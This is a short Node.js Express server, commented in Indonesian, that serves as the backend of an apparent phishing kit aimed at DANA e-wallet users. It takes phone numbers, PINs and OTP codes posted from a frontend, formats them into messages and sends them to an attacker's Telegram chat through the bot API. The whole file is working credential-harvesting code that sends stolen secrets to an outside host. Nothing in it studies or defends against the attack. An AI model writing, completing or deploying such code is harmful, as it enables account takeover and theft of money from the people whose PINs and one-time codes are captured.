require('dotenv').config();
const express = require('express');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const app = express();

// Middleware keamanan
app.use(express.json());
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 menit
  max: 100 // Batas 100 request per IP
}));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Fungsi untuk format pesan
function formatDanaMessage(type, phone, pin, otp) {
  switch (type) {
    case 'phone':
      return `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${phone}\n╰───────────────────`;
    case 'pin':
      return `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${phone}\n├───────────────────\n├• PIN  : ${pin}\n╰───────────────────`;
    case 'otp':
      return `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${phone}\n├───────────────────\n├• PIN  : ${pin}\n├───────────────────\n├• OTP : ${otp}\n╰───────────────────`;
    default:
      return '';
  }
}

// Endpoint untuk menerima data dari frontend
app.post('/api/send-dana-data', async (req, res) => {
  try {
    const { type, phone, pin, otp } = req.body;

    // Validasi input
    if (!type || !phone) {
      return res.status(400).json({ error: 'Data tidak lengkap' });
    }

    const message = formatDanaMessage(type, phone, pin, otp);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Menjalankan server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server berjalan di port ${PORT}`));
